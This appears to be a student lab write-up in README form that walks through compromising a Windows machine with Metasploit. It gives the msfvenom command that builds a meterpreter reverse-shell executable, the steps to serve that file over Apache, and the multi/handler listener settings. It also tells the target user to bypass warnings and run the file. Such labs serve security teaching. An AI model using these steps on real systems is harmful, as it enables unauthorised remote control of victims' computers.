# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="820" height="370" alt="1" src="https://github.com/user-attachments/assets/6b180029-819f-4997-9de2-bed0fba6459c" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="820" height="370" alt="1" src="https://github.com/user-attachments/assets/cf64835a-e659-488e-8a50-7cf2a71ade0f" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="569" height="55" alt="3" src="https://github.com/user-attachments/assets/ea1a89c9-7e9c-47ed-8af0-f780fb81cb09" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="421" height="55" alt="4" src="https://github.com/user-attachments/assets/2cfde1d6-f3cb-41ff-95e3-93fb9278c4cf" />

Check the status of apache2
## OUTPUT:

<img width="598" height="110" alt="5" src="https://github.com/user-attachments/assets/1c9a31c0-4387-4973-86b4-c0423e43b7c4" />


Invoke msfconsole:
## OUTPUT:


<img width="659" height="395" alt="7" src="https://github.com/user-attachments/assets/4c6484be-ace5-4d23-9341-9f3b2e0aa80b" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:

<img width="1065" height="846" alt="8" src="https://github.com/user-attachments/assets/65b5031d-30b4-4419-80b2-a98053f1ffd9" />


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:


<img width="817" height="262" alt="9" src="https://github.com/user-attachments/assets/d8e85d5a-ea3e-47a2-a214-b7ef64d23cba" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:

<img width="1487" height="643" alt="10" src="https://github.com/user-attachments/assets/e20001a7-10d6-4e8e-bcc9-446aa8b7dab7" />


Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1062" height="813" alt="11" src="https://github.com/user-attachments/assets/3871238a-d339-4540-90cc-0db87bc0f08c" />


On kali/parrot give the command exploit
## OUTPUT:
<img width="793" height="156" alt="12" src="https://github.com/user-attachments/assets/545ae12c-94e6-4cba-ae1d-57b99c790811" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.



